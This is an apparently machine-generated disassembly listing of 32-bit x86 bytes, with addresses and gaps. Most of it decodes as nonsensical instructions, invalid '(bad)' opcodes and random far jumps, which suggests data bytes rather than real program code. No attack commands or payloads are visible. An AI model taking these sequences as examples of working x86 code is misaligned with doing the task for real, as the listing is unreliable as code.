  42b607:	add    BYTE PTR [ecx+eax*1],al
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	inc    ebx
  42b60d:	sub    BYTE PTR [ecx],al
  42b60f:	shl    BYTE PTR [eax+0x1b],0x1c
  42b613:	adc    BYTE PTR [edx-0x72],dh
  42b616:	cs int 0x35
  42b619:	aad    0xb
  42b61b:	arpl   WORD PTR [esi+0x6aaf5235],bx
  42b621:	sbb    DWORD PTR [ecx*4-0x5dfb09c6],eax
  42b628:	pop    ebp
  42b629:	jecxz  0x42b5c9
  42b62b:	adc    eax,0x1d428376
  42b630:	xor    DWORD PTR [edx],edx
  42b632:	xchg   esi,eax
  42b633:	mov    esi,0xf114f5d0
  42b638:	xor    edx,DWORD PTR [ebx+0x5c2e1819]
  42b63e:	fsubr  DWORD PTR [ecx+0x12]
  42b641:	cmp    eax,0x6f7bd09d
  42b646:	mov    al,ch
  42b648:	push   ecx
  42b649:	xor    al,BYTE PTR [ebx]
  42b64b:	cmp    cl,ah
  42b64d:	cmc    
  42b64e:	les    esi,FWORD PTR [edi-0x51]
  42b651:	jae    0x42b6b1
  42b653:	(bad)  
  42b654:	ds js  0x42b5f9
  42b657:	pop    esi
  42b658:	std    
  42b659:	mov    esi,0x4a4c4c3e
  42b65e:	rcl    DWORD PTR [eax-0x23],1
  42b661:	add    al,BYTE PTR [edx]
  42b663:	xor    BYTE PTR [ebp-0x3f],ah
  42b666:	pop    esi
  42b667:	scas   al,BYTE PTR es:[edi]
  42b668:	pop    ebp
  42b669:	test   al,0xa8
  42b66b:	mov    ch,0xc3
  42b66d:	add    dh,BYTE PTR [ebp-0x2fa22d38]
  42b673:	arpl   WORD PTR [ecx-0x73],di
  42b676:	gs scas eax,DWORD PTR es:[edi]
  42b678:	in     eax,dx
  42b679:	out    0xc7,eax
  42b67b:	cmp    eax,0x19fa78d4
  42b680:	(bad)  
  42b681:	cmp    BYTE PTR [edi+0x3c],bh
  42b684:	iret   
  42b685:	mov    al,0x99
  42b687:	cdq    
  42b688:	lods   al,BYTE PTR ds:[esi]
  42b689:	jmp    0x42b643
  42b68b:	pop    ebp
  42b68c:	add    esp,ebx
  42b68e:	and    BYTE PTR [esi-0x3f5c480b],ah
  42b694:	xchg   ebx,eax
  42b695:	fmul   DWORD PTR [ecx+0x5b]
  42b698:	add    dh,ah
  42b69a:	jge    0x42b624
  42b69c:	in     eax,dx
  42b69d:	dec    ebx
  42b69e:	loop   0x42b656
  42b6a0:	dec    eax
  42b6a1:	retf   0x84b8
  42b6a4:	call   FWORD PTR [ecx]
  42b6a6:	push   0x375220a4
  42b6ab:	(bad)  
  42b6ac:	clc    
  42b6ad:	dec    edx
  42b6ae:	push   ebx
  42b6af:	popa   
  42b6b0:	cmp    eax,0xd9eb0676
  42b6b5:	std    
  42b6b6:	sub    cl,BYTE PTR [esi+0x2248d4c3]
  42b6bc:	jnp    0x42b66d
  42b6be:	addr16 push ebp
  42b6c0:	cmp    al,BYTE PTR [edx]
  42b6c2:	fisttp DWORD PTR [ecx-0x78dd1854]
  42b6c8:	call   0x6a22:0xeb15e182
  42b6cf:	dec    eax
  42b6d0:	lahf   
  42b6d1:	leave  
  42b6d2:	(bad)  
  42b6d3:	xor    DWORD PTR ds:0xbd867cb0,edi
  42b6d9:	sub    ch,BYTE PTR [ebx+0x24]
  42b6dc:	cmp    DWORD PTR [edx],edx
  42b6de:	adc    BYTE PTR [eax],bh
  42b6e0:	sbb    ah,BYTE PTR [ebp-0x6396ad33]
  42b6e6:	das    
  42b6e7:	mov    ebx,0xc5cbad7f
  42b6ec:	sbb    ebp,DWORD PTR ds:0x8310ae92
  42b6f2:	leave  
  42b6f3:	sbb    al,0xe3
  42b6f5:	cmp    eax,0x858ebe7c
  42b6fa:	test   esp,esi
  42b6fc:	rep outs dx,DWORD PTR ds:[esi]
  42b6fe:	sub    BYTE PTR [edi+edx*2+0x6b56fd7f],dl
  42b705:	adc    bh,BYTE PTR [edx-0x2d5b326c]
  42b70b:	pushf  
  42b70c:	cmp    al,0x88
  42b70e:	dec    edx
  42b70f:	lea    eax,[eax]
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	inc    esp
  42b781:	and    al,0x78
  42b783:	mov    edx,0x1d0c8
  42b788:	add    al,0x1
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	adc    al,BYTE PTR [esi-0x15badb33]
  42b792:	cmp    dh,dh
  42b794:	shl    dl,1
  42b796:	mov    ebx,0xedbf8570
  42b79b:	ins    BYTE PTR es:[edi],dx
  42b79c:	dec    eax
  42b79d:	jmp    WORD PTR [esi]
  42b7a0:	inc    edi
  42b7a1:	xlat   BYTE PTR ds:[ebx]
  42b7a2:	aad    0xb0
  42b7a4:	pusha  
  42b7a5:	mov    esp,DWORD PTR [edi]
  42b7a7:	mul    edx
  42b7a9:	(bad)  
  42b7aa:	icebp  
  42b7ab:	cmp    BYTE PTR [ecx],bl
  42b7ad:	lods   eax,DWORD PTR ds:[esi]
  42b7ae:	xor    ch,ch
  42b7b0:	push   ebx
  42b7b1:	aad    0x18
  42b7b3:	mov    ebx,0xec8ab1b0
  42b7b8:	jae    0x42b759
  42b7ba:	xchg   edx,eax
  42b7bb:	push   esp
  42b7bc:	add    DWORD PTR [eax-0x4679c092],esp
  42b7c2:	test   ecx,edi
  42b7c4:	xbegin 0x4fc95e61
  42b7ca:	jmp    0x697d9093
  42b7cf:	sbb    edi,ebp
  42b7d1:	hlt    
  42b7d2:	xor    BYTE PTR [edi+0x49c5bf73],ah
  42b7d8:	pop    ds
  42b7d9:	aam    0xc0
  42b7db:	out    0x39,eax
  42b7dd:	adc    BYTE PTR [esi-0x7d],0x24
  42b7e1:	pop    ss
  42b7e2:	sub    edi,DWORD PTR [eax]
  42b7e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7e5:	dec    ebx
  42b7e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7e7:	into   
  42b7e8:	pop    edx
  42b7e9:	cmp    ebx,DWORD PTR [edx+ebx*1+0x22b12f9e]
  42b7f0:	pop    ecx
  42b7f1:	mov    eax,0xeb5eca92
  42b7f6:	xchg   ebx,eax
  42b7f7:	jno    0x42b824
  42b7f9:	sub    esi,ebx
  42b7fb:	sub    ah,BYTE PTR [esi]
  42b7fd:	and    dl,ch
  42b7ff:	sbb    ch,BYTE PTR [ebp+0x112348d3]
  42b805:	pusha  
  42b806:	les    ebp,FWORD PTR [eax+0x773ba91b]
  42b80c:	dec    edx
  42b80d:	out    0x43,eax
  42b80f:	push   0xe8677bd1
  42b814:	cld    
  42b815:	call   0x329c:0x4576c7d6
  42b81c:	pushf  
  42b81d:	mul    esi
  42b81f:	outs   dx,DWORD PTR ds:[esi]
  42b820:	push   ebx
  42b821:	add    bl,BYTE PTR [eax]
  42b823:	clc    
  42b824:	inc    edi
  42b825:	or     DWORD PTR [ebx-0x4e],esp
  42b828:	lea    edi,[ecx]
  42b82a:	push   cs
  42b82b:	iret   
  42b82c:	dec    esi
  42b82d:	jg     0x42b7c6
  42b82f:	sub    DWORD PTR [esi],eax
  42b831:	cmp    ebp,DWORD PTR [edx+ecx*2]
  42b834:	pusha  
  42b835:	pop    esi
  42b836:	in     eax,dx
  42b837:	jne    0x42b85d
  42b839:	mov    bl,0xdd
  42b83b:	xchg   edi,eax
  42b83c:	add    eax,DWORD PTR [ebx-0x3]
  42b83f:	ja     0x42b8b0
  42b841:	int3   
  42b842:	in     eax,dx
  42b843:	mov    ch,BYTE PTR [eax]
  42b845:	(bad)  
  42b846:	das    
  42b847:	scas   eax,DWORD PTR es:[edi]
  42b848:	(bad)  
  42b849:	loopne 0x42b827
  42b84b:	clc    
  42b84c:	js     0x42b81f
  42b84e:	xor    eax,0x82d65775
  42b853:	ins    DWORD PTR es:[edi],dx
  42b854:	inc    ebp
  42b855:	xchg   ebp,eax
  42b856:	mov    ecx,0xc848188b
  42b85b:	dec    ebx
  42b85c:	stc    
  42b85d:	xchg   edi,eax
  42b85e:	fs pop eax
  42b860:	push   esp
  42b861:	xlat   BYTE PTR ds:[ebx]
  42b862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b863:	push   esi
  42b864:	fcom   DWORD PTR [edx]
  42b866:	loop   0x42b804
  42b868:	aas    
  42b869:	adc    eax,0x4fe075d3
  42b86e:	imul   esp,DWORD PTR [edi-0x38],0xe0308ed8
  42b875:	jne    0x42b844
  42b877:	pushf  
  42b878:	repz sub BYTE PTR fs:[ebx+ecx*2+0x52],dh
  42b87e:	scas   al,BYTE PTR es:[edi]
  42b87f:	and    DWORD PTR ds:0xff71bddd,ebp
  42b885:	mov    DWORD PTR [ebx],edx
  42b887:	js     0x42b873
  42b889:	les    edx,FWORD PTR [edx+0x3d]
  42b88c:	cmp    eax,0xa0cd
	...
  42b8f2:	add    BYTE PTR [eax],al
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     esp,edi
  42b901:	xchg   esp,eax
  42b902:	(bad)  
  42b903:	dec    esi
  42b904:	int3   
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	and    dl,al
  42b90e:	lods   al,BYTE PTR ds:[esi]
  42b90f:	aad    0x3d
  42b911:	xchg   DWORD PTR [eax],ebp
  42b913:	daa    
  42b914:	xor    DWORD PTR [ebp-0x2c6304ff],esp
  42b91a:	aad    0xe5
  42b91c:	test   edi,ebx
  42b91e:	in     al,0x37
  42b920:	mov    ecx,DWORD PTR [edi]
  42b922:	repz (bad) 
  42b925:	scas   eax,DWORD PTR es:[edi]
  42b926:	xchg   esi,eax
  42b927:	push   0x65
  42b929:	shr    ecx,cl
  42b92b:	inc    eax
  42b92c:	or     ecx,DWORD PTR [edx]
  42b92e:	sub    DWORD PTR [ecx+0x1de83fd7],0xfffffff8
  42b935:	push   0xd26014f1
  42b93a:	cli    
  42b93b:	adc    DWORD PTR [eax-0x28],ebp
  42b93e:	leave  
  42b93f:	sbb    al,0x28
  42b941:	adc    eax,0xc4bc6714
  42b946:	std    
  42b947:	sbb    DWORD PTR [eax],0x2c
  42b94a:	jbe    0x42b8e8
  42b94c:	adc    al,0x47
  42b94e:	push   edi
  42b94f:	ds dec edx
  42b951:	ins    DWORD PTR es:[edi],dx
  42b952:	data16 aad 0x9d
  42b955:	in     al,dx
  42b956:	ins    DWORD PTR es:[edi],dx
  42b957:	rol    BYTE PTR [ecx-0x3d],0x70
  42b95b:	inc    esi
  42b95c:	mov    cl,0x5e
  42b95e:	outs   dx,DWORD PTR ds:[esi]
  42b95f:	fwait
  42b960:	pop    esi
  42b961:	sahf   
  42b962:	out    0x56,al
  42b964:	loopne 0x42b8f9
  42b966:	add    ecx,DWORD PTR [esi+0x627b5a3e]
  42b96c:	scas   al,BYTE PTR es:[edi]
  42b96d:	jge    0x42b944
  42b96f:	pop    edx
  42b970:	xor    eax,0xcd51b4f
  42b975:	test   DWORD PTR [esi+0x29c0a56],0x8a2232d8
  42b97f:	(bad)  
  42b980:	add    DWORD PTR [ebx-0x72],edx
  42b983:	jge    0x42b916
  42b985:	mov    cl,0x8c
  42b987:	retf   
  42b988:	pushf  
  42b989:	jns    0x42b929
  42b98b:	push   es
  42b98c:	and    ebx,edi
  42b98e:	mov    ch,0xba
  42b990:	bswap  eax
  42b992:	and    ah,BYTE PTR [ecx-0x32c15434]
  42b998:	addr16 jae 0x42ba14
  42b99b:	loop   0x42b9f1
  42b99d:	adc    dl,BYTE PTR [ecx]
  42b99f:	mov    bl,0xc8
  42b9a1:	push   esi
  42b9a2:	adc    dl,BYTE PTR [edx-0x6615e9a9]
  42b9a8:	push   0x16fc78d8
  42b9ad:	addr16 cdq 
  42b9af:	test   BYTE PTR [edx],cl
  42b9b1:	test   al,0xa4
  42b9b3:	cmp    cl,0x26
  42b9b6:	cmp    esi,ebp
  42b9b8:	scas   eax,DWORD PTR es:[edi]
  42b9b9:	div    BYTE PTR [edi+0xf]
  42b9bc:	mov    ch,0x5e
  42b9be:	mov    edx,0x5fd3b99
  42b9c3:	push   eax
  42b9c4:	xchg   ebx,eax
  42b9c5:	call   0x85f72fb4
  42b9ca:	ins    DWORD PTR es:[edi],dx
  42b9cb:	cmp    DWORD PTR [edi-0x45],0x4d
  42b9cf:	mov    ds:0xa8f0d662,eax
  42b9d4:	int3   
  42b9d5:	sbb    BYTE PTR [eax],cl
  42b9d7:	sbb    DWORD PTR [ebp+0x4d9a113b],ecx
  42b9dd:	imul   DWORD PTR [edx-0x68fce533]
  42b9e3:	daa    
  42b9e4:	dec    ebx
  42b9e5:	inc    eax
  42b9e6:	add    DWORD PTR [edi-0xea2f23c],ecx
  42b9ec:	repz or esp,ecx
  42b9ef:	test   al,0xb7
  42b9f1:	add    eax,0x7a1033e6
  42b9f6:	pop    ebp
  42b9f7:	pop    edi
  42b9f8:	cdq    
  42b9f9:	push   ebp
  42b9fa:	setb   BYTE PTR [ecx+0x38e8b0c]
  42ba01:	add    cl,BYTE PTR [edx+esi*4+0x44]
  42ba05:	pop    ebp
  42ba06:	cli    
  42ba07:	inc    ebx
  42ba08:	aaa    
  42ba09:	shr    DWORD PTR [edx+0xcea5cc0],cl
  42ba0f:	push   esi
	...
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [eax+ecx*2],esi
  42ba82:	xchg   ah,cl
  42ba84:	rcl    dl,1
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    al,0x1
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	xchg   ch,dl
  42ba8e:	cwde   
  42ba8f:	scas   eax,DWORD PTR es:[edi]
  42ba90:	(bad)  
  42ba91:	out    dx,al
  42ba92:	push   0x48
  42ba94:	jnp    0x42bad2
  42ba96:	push   ecx
  42ba97:	arpl   WORD PTR [esi+0x45],cx
  42ba9a:	mov    esi,DWORD PTR [ebx+0x0]
  42ba9d:	xchg   ebx,eax
  42ba9e:	sub    cl,ch
  42baa0:	xchg   BYTE PTR [ebx-0x4388a407],ah
  42baa6:	mov    al,0xb9
  42baa8:	pop    edx
  42baa9:	pop    ecx
  42baaa:	sahf   
  42baab:	dec    esp
  42baac:	sub    DWORD PTR [eax-0x759456e3],0xffffffad
  42bab3:	jl     0xf194d299
  42bab9:	jmp    0xb948:0x8d4f1318
  42bac0:	shl    DWORD PTR [eax-0x75],1
  42bac3:	xlat   BYTE PTR ds:[ebx]
  42bac4:	jmp    0xf810:0xd5f3aea6
  42bacb:	stos   BYTE PTR es:[edi],al
  42bacc:	out    0xf7,eax
  42bace:	cmp    eax,0x82081578
  42bad3:	lock pop ds
  42bad5:	sbb    cl,ch
  42bad7:	cmp    BYTE PTR [edx+0x292af214],ah
  42badd:	sar    DWORD PTR [ebp+0x79c63b93],1
  42bae3:	jns    0x42bb2b
  42bae5:	lea    edi,[edx-0xcaada33]
  42baeb:	mov    al,ds:0x1296ea5b
  42baf0:	jnp    0x42baab
  42baf2:	cmp    BYTE PTR [ecx+0x6c178136],ah
  42baf8:	call   0x233116f6
  42bafd:	xchg   esi,eax
  42bafe:	mov    ecx,DWORD PTR [eax+edi*1+0x78a3e6f9]
  42bb05:	jle    0x42bab9
  42bb07:	enter  0x941f,0xeb
  42bb0b:	pop    ecx
  42bb0c:	jecxz  0x42bafb
  42bb0e:	sub    DWORD PTR [edx+0x110816f9],eax
  42bb14:	sbb    DWORD PTR [esi+0x53],edx
  42bb17:	push   edx
  42bb18:	sub    eax,0x67c23a81
  42bb1d:	mov    eax,0x2823ece9
  42bb22:	out    dx,al
  42bb23:	xchg   ecx,eax
  42bb24:	(bad)  
  42bb25:	pop    ss
  42bb26:	lods   al,BYTE PTR ds:[esi]
  42bb27:	push   ecx
  42bb28:	jmp    0xd2b0:0x8ead1d65
  42bb2f:	push   eax
  42bb30:	adc    esi,ebp
  42bb32:	mov    cl,0x44
  42bb34:	ins    BYTE PTR es:[edi],dx
  42bb35:	sub    esi,DWORD PTR [esi]
  42bb37:	jns    0x42bb6b
  42bb39:	push   ss
  42bb3a:	dec    eax
  42bb3b:	push   edx
  42bb3c:	xchg   ebx,eax
  42bb3d:	fldenv [esi+0x5f]
  42bb40:	test   al,0x62
  42bb42:	mov    ecx,0x44f2f0c4
  42bb47:	xor    dl,BYTE PTR ds:0xbb53d815
  42bb4d:	add    ah,BYTE PTR [edx]
  42bb4f:	mov    esp,0x2749e506
  42bb54:	jmp    DWORD PTR [eax]
  42bb56:	in     eax,dx
  42bb57:	loope  0x42bb1b
  42bb59:	push   ebx
  42bb5a:	data16 aaa 
  42bb5c:	clc    
  42bb5d:	mov    dl,0xd3
  42bb5f:	mov    ebp,0xb95a425a
  42bb64:	addr16 ds out 0x61,al
  42bb68:	push   esi
  42bb69:	fldcw  WORD PTR [ebx+0x47]
  42bb6c:	mov    edi,0x697fd48b
  42bb71:	mov    dh,BYTE PTR [edx-0x79]
  42bb74:	fwait
  42bb75:	leave  
  42bb76:	call   0xa9257015
  42bb7b:	sahf   
  42bb7c:	sbb    al,0x39
  42bb7e:	aaa    
  42bb7f:	push   ds
  42bb80:	gs int3 
  42bb82:	loope  0x42bbd8
  42bb84:	xchg   ebp,eax
  42bb85:	sbb    eax,0x117185f3
  42bb8a:	xchg   BYTE PTR [ecx-0x4bae03f6],ah
	...
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	adc    al,0x3c
  42bc02:	xchg   BYTE PTR [eax+0x1d3d4],bl
  42bc08:	add    al,0x1
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	mov    ecx,0xe165d777
  42bc11:	loope  0x42bbb7
  42bc13:	repnz adc BYTE PTR [edi-0x1b],0x41
  42bc18:	mov    edi,0x44e68256
  42bc1d:	xor    eax,0x13b4c347
  42bc22:	stos   DWORD PTR es:[edi],eax
  42bc23:	stos   BYTE PTR es:[edi],al
  42bc24:	cs inc ebp
  42bc26:	or     BYTE PTR [ecx+0xb],dl
  42bc29:	(bad)  
  42bc2a:	jg     0x42bc5e
  42bc2c:	jg     0x42bc99
  42bc2e:	xlat   BYTE PTR ds:[ebx]
  42bc2f:	pusha  
  42bc30:	fmul   QWORD PTR [esp+ecx*1]
  42bc33:	xor    esp,esi
  42bc35:	mov    ds:0x2681579f,eax
  42bc3a:	retf   0xab45
  42bc3d:	cld    
  42bc3e:	mov    edx,0xd67255a6
  42bc43:	xor    dl,BYTE PTR [edx+esi*8-0x29]
  42bc47:	fs aas 
  42bc49:	ret    
  42bc4a:	and    BYTE PTR [eax-0x3da319ac],ah
  42bc50:	push   es
  42bc51:	jno    0x42bcc6
  42bc53:	add    bh,BYTE PTR [ecx]
  42bc55:	mov    ecx,0xf3b7c9a8
  42bc5a:	add    al,0x5
  42bc5c:	mov    esi,0x500fb931
  42bc61:	sti    
  42bc62:	outs   dx,BYTE PTR ds:[esi]
  42bc63:	pushw  ds
  42bc65:	sbb    al,0x56
  42bc67:	xor    BYTE PTR [ebp+0x10faf03],ch
  42bc6d:	jge    0x42bcb3
  42bc6f:	nop
  42bc70:	popa   
  42bc71:	mov    ebx,ss
  42bc73:	adc    BYTE PTR [edi+eiz*8],dh
  42bc76:	or     DWORD PTR [ebp+0x3f],0x5afd3289
  42bc7d:	mov    WORD PTR [eax+0x72a205c0],?
  42bc83:	ret    0xa1a6
  42bc86:	pop    es
  42bc87:	xchg   edi,eax
  42bc88:	sub    al,0x52
  42bc8a:	(bad)
  42bc8d:	fcomip st,st(5)
  42bc8f:	xchg   esi,eax
  42bc90:	stos   BYTE PTR es:[edi],al
  42bc91:	mov    ebp,0x3783b2ba
  42bc96:	cmp    eax,0x68fd92cd
  42bc9b:	(bad)  
  42bc9c:	pop    ebp
  42bc9d:	inc    ecx
  42bc9e:	jno    0x42bc92
  42bca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bca1:	pusha  
  42bca2:	cwde   
  42bca3:	out    0x8a,al
  42bca5:	cwde   
  42bca6:	xchg   cl,bh
  42bca8:	cmp    BYTE PTR [ebx-0x357771ba],0x99
  42bcaf:	adc    cl,BYTE PTR [esi]
  42bcb1:	cmp    al,0x51
  42bcb3:	sbb    esi,DWORD PTR [ebx-0x23380222]
  42bcb9:	out    0x6f,eax
  42bcbb:	mov    dl,0xf
  42bcbd:	clc    
  42bcbe:	push   ds
  42bcbf:	stos   DWORD PTR es:[edi],eax
  42bcc0:	push   cs
  42bcc1:	xor    dh,BYTE PTR [ebx]
  42bcc3:	inc    edi
  42bcc4:	xchg   ebp,eax
  42bcc5:	xchg   esp,eax
  42bcc6:	repz sbb cl,BYTE PTR [ecx+0x7]
  42bcca:	xchg   edi,eax
  42bccb:	or     ch,cl
  42bccd:	test   al,0xa9
  42bccf:	jnp    0x42bcf9
  42bcd1:	adc    al,0xe9
  42bcd3:	adc    BYTE PTR [edi],cl
  42bcd5:	(bad)  
  42bcd6:	outs   dx,DWORD PTR ds:[esi]
  42bcd7:	les    esi,FWORD PTR [edi-0x4b]
  42bcda:	fldcw  WORD PTR [edi-0x79652a86]
  42bce0:	pop    ebp
  42bce1:	push   edx
  42bce2:	jne    0x42bcdb
  42bce4:	scas   eax,DWORD PTR es:[edi]
  42bce5:	and    al,0x56
  42bce7:	pusha  
  42bce8:	pop    ds
  42bce9:	jp     0x42bc9b
  42bceb:	inc    esp
  42bcec:	mov    cl,0x41
  42bcee:	pop    ds
  42bcef:	ret    0xc1b
  42bcf2:	dec    BYTE PTR [ebx+0x1e]
  42bcf5:	xor    cl,ch
  42bcf7:	lock mov es,WORD PTR [edi]
  42bcfa:	mov    dh,0x76
  42bcfc:	fbld   TBYTE PTR [ebx+0x3caf0868]
  42bd02:	pop    ds
  42bd03:	rcr    DWORD PTR [ebx-0x13],cl
  42bd06:	iret   
  42bd07:	cld    
  42bd08:	mov    ecx,0x1b8b7b5f
  42bd0d:	inc    ecx
  42bd0e:	in     al,dx
  42bd0f:	inc    ecx
	...
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bdad
  42bd81:	sub    edx,DWORD PTR [esi]
  42bd83:	sbb    eax,0x1d4d8
  42bd88:	add    al,0x1
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	xchg   esp,eax
  42bd8d:	mov    ebp,0xdae8e5f1
  42bd92:	inc    ebx
  42bd93:	jns    0x42bdfc
  42bd95:	jecxz  0x42bd74
  42bd97:	shl    edi,1
  42bd99:	mov    al,ds:0x357221d
  42bd9e:	and    ch,dl
  42bda0:	xchg   ecx,eax
  42bda1:	stos   BYTE PTR es:[edi],al
  42bda2:	lea    esi,[ebx-0x4c]
  42bda5:	xchg   ebx,eax
  42bda6:	cld    
  42bda7:	lahf   
  42bda8:	mov    ecx,0xa82237b5
  42bdad:	or     ch,BYTE PTR [edx*2-0x4e2956cd]
  42bdb4:	inc    esi
  42bdb5:	stos   BYTE PTR es:[edi],al
  42bdb6:	ss js  0x42bda6
  42bdb9:	sbb    BYTE PTR [edx*8-0x59b7de8e],ch
  42bdc0:	jmp    0xb0de:0x7eeaa410
  42bdc7:	adc    edi,0xffffff86
  42bdca:	xchg   edx,eax
  42bdcb:	jbe    0x42bd6f
  42bdcd:	add    al,0x72
  42bdcf:	test   eax,0x83415820
  42bdd4:	aad    0xb1
  42bdd6:	push   esp
  42bdd7:	mov    ebx,0x53afa445
  42bddc:	sub    bh,bl
  42bdde:	les    ebp,FWORD PTR [ebp-0x45]
  42bde1:	xchg   ebx,eax
  42bde2:	pop    ebp
  42bde3:	div    DWORD PTR [ebp+0x4c]
  42bde6:	(bad)  
  42bde7:	jns    0x42be62
  42bde9:	adc    edi,DWORD PTR [eax+0x3f59c0de]
  42bdef:	push   edx
  42bdf0:	mov    ebx,DWORD PTR [eax]
  42bdf2:	pop    ss
  42bdf3:	scas   al,BYTE PTR es:[edi]
  42bdf4:	jnp    0x42bde4
  42bdf6:	jnp    0x42be61
  42bdf8:	pop    ecx
  42bdf9:	xchg   esi,eax
  42bdfa:	je     0x42bdc0
  42bdfc:	and    DWORD PTR [ebp+0x7f454d7d],edi
  42be02:	cmp    BYTE PTR [eax],bh
  42be04:	leave  
  42be05:	sti    
  42be06:	out    dx,al
  42be07:	fnsave [edx-0x65]
  42be0a:	jnp    0x42be8a
  42be0c:	sbb    DWORD PTR [ecx-0x3cf61232],edx
  42be12:	ret    
  42be13:	shl    DWORD PTR [ebx-0x4b2a856c],1
  42be19:	mov    ebx,cs
  42be1b:	sbb    eax,ebx
  42be1d:	ins    DWORD PTR es:[edi],dx
  42be1e:	das    
  42be1f:	mov    ds:0x8f334d9,al
  42be24:	xor    al,0xe1
  42be26:	rol    BYTE PTR [edx-0x45],cl
  42be29:	jecxz  0x42bdcb
  42be2b:	xchg   BYTE PTR [eax-0x39a31750],ch
  42be31:	int    0x83
  42be33:	sub    eax,0xd648c7a4
  42be38:	push   ebx
  42be39:	inc    esi
  42be3a:	pop    ss
  42be3b:	lock in eax,0xeb
  42be3e:	and    eax,0x5fb81515
  42be43:	pop    ebp
  42be44:	popa   
  42be45:	push   ebx
  42be46:	fld    TBYTE PTR ds:0xf52c92fc
  42be4c:	fs push ebx
  42be4e:	jae    0x42be90
  42be50:	repz jle 0x42bdd7
  42be53:	pop    eax
  42be54:	or     ebx,DWORD PTR [ebx+0x5d0c7c23]
  42be5a:	test   DWORD PTR [eax+ecx*8-0x13447169],esi
  42be61:	inc    esp
  42be62:	mov    ecx,0x18de6047
  42be67:	cmp    ecx,0xd36f0389
  42be6d:	fcomp  QWORD PTR [edi]
  42be6f:	scas   eax,DWORD PTR es:[edi]
  42be70:	xchg   edx,eax
  42be71:	mov    bl,0x7e
  42be73:	(bad)  
  42be74:	in     al,dx
  42be75:	(bad)  
  42be77:	out    dx,eax
  42be78:	fisttp QWORD PTR [ecx]
  42be7a:	cmp    ch,dl
  42be7c:	mov    ebp,0x590f958b
  42be81:	leave  
  42be82:	xor    al,0x5e
  42be84:	sbb    eax,0xb62a36cb
  42be89:	test   BYTE PTR [eax],ch
  42be8b:	dec    ecx
  42be8c:	in     al,0x6a
  42be8e:	mov    ebp,0x79
	...
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42bec8
  42bf01:	xor    dl,BYTE PTR [edx-0x7c]
  42bf04:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    al,0x1
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	adc    al,0x39
  42bf0e:	lods   al,BYTE PTR ds:[esi]
  42bf0f:	push   ebx
  42bf10:	in     eax,dx
  42bf11:	add    bh,BYTE PTR [esi+0x3d]
  42bf14:	sbb    al,0x6c
  42bf16:	(bad)  
  42bf17:	nop
  42bf18:	dec    esp
  42bf19:	ret    0xda45
  42bf1c:	lea    esp,[ebp-0x5fbdb059]
  42bf22:	jno    0x42beee
  42bf24:	(bad)
  42bf27:	je     0x42bee1
  42bf29:	imul   eax,DWORD PTR [ebx],0x29
  42bf2c:	sub    DWORD PTR [edi+ebx*1],esi
  42bf2f:	scas   al,BYTE PTR es:[edi]
  42bf30:	hlt    
  42bf31:	stos   BYTE PTR es:[edi],al
  42bf32:	outs   dx,DWORD PTR ds:[esi]
  42bf33:	push   ecx
  42bf34:	sbb    DWORD PTR [edx-0x5f6a9a91],edi
  42bf3a:	sahf   
  42bf3b:	xor    WORD PTR [edi+0x2dfa012b],di
  42bf42:	sub    edi,eax
  42bf44:	test   eax,0x11b9e9e5
  42bf49:	icebp  
  42bf4a:	or     eax,0x52b4dc7f
  42bf4f:	imul   edi,DWORD PTR [esi],0x8b3ec1ef
  42bf55:	sbb    al,0xe1
  42bf57:	fwait
  42bf58:	xchg   edi,eax
  42bf59:	lea    edi,[edi-0x3b7a797f]
  42bf5f:	pop    edx
  42bf60:	scas   eax,DWORD PTR es:[edi]
  42bf61:	or     BYTE PTR [ebp-0x3945c511],bl
  42bf67:	clc    
  42bf68:	call   0xf1cd34f1
  42bf6d:	addr16 pop eax
  42bf6f:	sbb    BYTE PTR [ecx-0x30],0xdd
  42bf73:	test   BYTE PTR [eax-0x39],ah
  42bf76:	xchg   edx,eax
  42bf77:	(bad)  
  42bf79:	sbb    ebp,ebx
  42bf7b:	scas   al,BYTE PTR es:[edi]
  42bf7c:	aam    0xe8
  42bf7e:	lods   al,BYTE PTR ds:[esi]
  42bf7f:	cs stc 
  42bf81:	mov    esi,0xfe25cd9c
  42bf86:	ja     0x42bf0f
  42bf88:	(bad)  
  42bf89:	popa   
  42bf8a:	int3   
  42bf8b:	daa    
  42bf8c:	loope  0x42bf76
  42bf8e:	dec    edi
  42bf8f:	out    dx,eax
  42bf90:	jle    0x42bff2
  42bf92:	jbe    0x42bf46
  42bf94:	ret    0x9766
  42bf97:	fldenv [bp+0x4def]
  42bf9c:	sub    eax,0xf03f4dc2
